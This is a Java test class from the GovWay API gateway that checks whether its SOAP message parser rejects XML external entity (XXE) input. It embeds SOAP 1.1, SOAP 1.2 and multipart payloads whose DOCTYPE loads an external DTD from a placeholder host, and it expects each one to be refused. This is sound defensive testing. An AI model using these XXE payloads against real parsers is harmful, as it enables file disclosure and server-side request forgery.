/*
 * GovWay - A customizable API Gateway 
 * https://govway.org
 * 
 * Copyright (c) 2005-2023 Link.it srl (https://link.it).
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 3, as published by
 * the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
package org.openspcoop2.message.soap.test;

import java.io.ByteArrayInputStream;

import org.openspcoop2.message.AttachmentsProcessingMode;
import org.openspcoop2.message.OpenSPCoop2Message;
import org.openspcoop2.message.OpenSPCoop2MessageFactory;
import org.openspcoop2.message.constants.Costanti;
import org.openspcoop2.message.constants.MessageRole;
import org.openspcoop2.message.constants.MessageType;
import org.openspcoop2.message.soap.reader.OpenSPCoop2MessageSoapStreamReader;
import org.openspcoop2.utils.transport.http.HttpConstants;

/**
 * TestXXE
 * 
 * @author Andrea Poli (apoli@link.it)
 * @author $Author$
 * @version $Rev$, $Date$
 */
public class XXETest {

	
	private static byte [] soap11 = ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><!DOCTYPE x [ <!ENTITY\n"+
			"% test SYSTEM \"http://X.X.X.X/data.dtd\"> %test; ]>\n"+
			"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body>\n"+
			"<root>\n"+
			"<test>123</test>\n"+
			"</root>\n"+
			"</soapenv:Body></soapenv:Envelope>").getBytes();

	private static byte [] soap12 = ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><!DOCTYPE x [ <!ENTITY\n"+
			"% test SYSTEM \"http://X.X.X.X/data.dtd\"> %test; ]>\n"+
			"<soapenv:Envelope xmlns:soapenv=\"http://www.w3.org/2003/05/soap-envelope\"><soapenv:Body>\n"+
			"<root>\n"+
			"<test>123</test>\n"+
			"</root>\n"+
			"</soapenv:Body></soapenv:Envelope>").getBytes();
	
	
	private static String _soap_with_attachments = ("------=_Part_0_6330713.1171639717331\n"+
			"Content-Type: CONTENTTYPE; charset=UTF-8\n"+
			"Content-Transfer-Encoding: binary\n"+
			"Content-Id: <56D2051AED8F9598BB61721D8C95BA6F>\n"+
			"\n"+
			""+
			"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><!DOCTYPE x [ <!ENTITY\n"+
			"% test SYSTEM \"http://X.X.X.X/data.dtd\"> %test; ]>\n"+
			"<soapenv:Envelope xmlns:soapenv=\"NAMESPACE\"><soapenv:Body>\n"+
			"<root>\n"+
			"<test>123</test>\n"+
			"</root>\n"+
			"</soapenv:Body></soapenv:Envelope>"+
			"\n"+
			"------=_Part_0_6330713.1171639717331\n"+
			"Content-Type: text/plain; charset=UTF-8\n"+
			"Content-Transfer-Encoding: binary\n"+
			"Content-Id: <D559E7E9E29638A15AD37B90FCAEAD53>\n"+
			"\n"+
			"HELLO WORLD 1\n"+
			"\n"+
			"------=_Part_0_6330713.1171639717331\n"+
			"Content-Type: text/plain\n"+
			"Content-Transfer-Encoding: binary\n"+
			"Content-Id: <FF5ED4B1298A2E36CF986C32638C5257>\n"+
			"\n"+
			"HELLO WORLD 2\n"+
			"\n"+
			"------=_Part_0_6330713.1171639717331--");
	
	private static String soap11_with_attachments_content_type = "multipart/related;   boundary=\"----=_Part_0_6330713.1171639717331\";   type=\""+HttpConstants.CONTENT_TYPE_SOAP_1_1+"\"";
	private static byte[] soap11_with_attachments = _soap_with_attachments.
			replace("NAMESPACE", Costanti.SOAP_ENVELOPE_NAMESPACE).
			replace("CONTENTTYPE", HttpConstants.CONTENT_TYPE_SOAP_1_1).
			getBytes();
	
	private static String soap12_with_attachments_content_type = "multipart/related;   boundary=\"----=_Part_0_6330713.1171639717331\";   type=\""+HttpConstants.CONTENT_TYPE_SOAP_1_2+"\"";
	private static byte[] soap12_with_attachments = _soap_with_attachments.
			replace("NAMESPACE", Costanti.SOAP12_ENVELOPE_NAMESPACE).
			replace("CONTENTTYPE", HttpConstants.CONTENT_TYPE_SOAP_1_2).
			getBytes();
	
	
	public static void main(String [] args) throws Exception{
		test();
	}
	public static void test() throws Exception{
		
		// Default è true
		// AbstractXMLUtils.DISABLE_DTDs=false;
		
		OpenSPCoop2MessageFactory factory = OpenSPCoop2MessageFactory.getDefaultMessageFactory();
		
		
		
		System.out.println("- createMessage(byte[]) SOAP11");
		try {
			OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_11, MessageRole.REQUEST, HttpConstants.CONTENT_TYPE_SOAP_1_1+ ";charset=UTF-8", soap11, AttachmentsProcessingMode.getMemoryCacheProcessingMode()).getMessage_throwParseException();	
			msg.castAsSoap().getSOAPBody();
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream) SOAP11");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap11)){
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_11, MessageRole.REQUEST, HttpConstants.CONTENT_TYPE_SOAP_1_1+ ";charset=UTF-8", bin, null).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream+ SOAPReader) SOAP11");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap11)){
				OpenSPCoop2MessageSoapStreamReader soapReader = new OpenSPCoop2MessageSoapStreamReader(factory, HttpConstants.CONTENT_TYPE_SOAP_1_1+ ";charset=UTF-8", bin, 50);
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_11, MessageRole.REQUEST, HttpConstants.CONTENT_TYPE_SOAP_1_1+ ";charset=UTF-8", bin, null, soapReader).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		
		
		
		
		System.out.println("- createMessage(byte[]) SOAP12");
		try {
			OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_12, MessageRole.REQUEST, HttpConstants.CONTENT_TYPE_SOAP_1_2+ ";charset=UTF-8", soap12, AttachmentsProcessingMode.getMemoryCacheProcessingMode()).getMessage_throwParseException();	
			msg.castAsSoap().getSOAPBody();
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream) SOAP12");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap12)){
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_12, MessageRole.REQUEST, HttpConstants.CONTENT_TYPE_SOAP_1_2+ ";charset=UTF-8", bin, null).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream+ SOAPReader) SOAP12");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap12)){
				OpenSPCoop2MessageSoapStreamReader soapReader = new OpenSPCoop2MessageSoapStreamReader(factory, HttpConstants.CONTENT_TYPE_SOAP_1_2+ ";charset=UTF-8", bin, 50);
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_12, MessageRole.REQUEST, HttpConstants.CONTENT_TYPE_SOAP_1_2+ ";charset=UTF-8", bin, null, soapReader).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		
		
		
		
		System.out.println("- createMessage(byte[]) SOAP11withAttachments");
		try {
			OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_11, MessageRole.REQUEST, soap11_with_attachments_content_type, soap11_with_attachments, AttachmentsProcessingMode.getMemoryCacheProcessingMode()).getMessage_throwParseException();	
			msg.castAsSoap().getSOAPBody();
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream) SOAP11withAttachments");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap11_with_attachments)){
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_11, MessageRole.REQUEST, soap11_with_attachments_content_type, bin, null).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream+ SOAPReader) SOAP11withAttachments");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap11_with_attachments)){
				OpenSPCoop2MessageSoapStreamReader soapReader = new OpenSPCoop2MessageSoapStreamReader(factory, soap11_with_attachments_content_type, bin, 50);
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_11, MessageRole.REQUEST, soap11_with_attachments_content_type, bin, null, soapReader).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		
		
		
		
		System.out.println("- createMessage(byte[]) SOAP12withAttachments");
		try {
			OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_12, MessageRole.REQUEST, soap12_with_attachments_content_type, soap12_with_attachments, AttachmentsProcessingMode.getMemoryCacheProcessingMode()).getMessage_throwParseException();	
			msg.castAsSoap().getSOAPBody();
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream) SOAP12withAttachments");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap12_with_attachments)){
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_12, MessageRole.REQUEST, soap12_with_attachments_content_type, bin, null).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- createMessage(InputStream+ SOAPReader) SOAP12withAttachments");
		try {
			try(ByteArrayInputStream bin = new ByteArrayInputStream(soap12_with_attachments)){
				OpenSPCoop2MessageSoapStreamReader soapReader = new OpenSPCoop2MessageSoapStreamReader(factory, soap12_with_attachments_content_type, bin, 50);
				OpenSPCoop2Message msg = factory.createMessage(MessageType.SOAP_12, MessageRole.REQUEST, soap12_with_attachments_content_type, bin, null, soapReader).getMessage_throwParseException();	
				msg.castAsSoap().getSOAPBody();
			}
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("Document Type Declaration is not allowed")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}

		
		
		
		System.out.println("- envelopingSoap(byte[]) SOAP11");
		try {
			OpenSPCoop2Message msg = factory.envelopingMessage(MessageType.SOAP_11, MessageRole.REQUEST, 
					HttpConstants.CONTENT_TYPE_SOAP_1_1, "test", org.openspcoop2.utils.xml.test.TestXXE.xmlMessage,
					null, AttachmentsProcessingMode.getMemoryCacheProcessingMode(),
					true, false, -1).getMessage_throwParseException();			
			msg.castAsSoap().getSOAPBody();
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("A DOCTYPE is not allowed in content")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
		
		System.out.println("- envelopingSoap(byte[]) SOAP12");
		try {
			OpenSPCoop2Message msg = factory.envelopingMessage(MessageType.SOAP_12, MessageRole.REQUEST, 
					HttpConstants.CONTENT_TYPE_SOAP_1_2, "test", org.openspcoop2.utils.xml.test.TestXXE.xmlMessage,
					null, AttachmentsProcessingMode.getMemoryCacheProcessingMode(),
					true, false, -1).getMessage_throwParseException();			
			msg.castAsSoap().getSOAPBody();
			throw new Exception("createMessage ok ?");
		}catch(Exception e) {
			if(e.getMessage().contains("A DOCTYPE is not allowed in content")) {
				System.out.println("\t Eccezione attesa: "+e.getMessage());
			}
			else {
				throw e;
			}
		}
	}

}
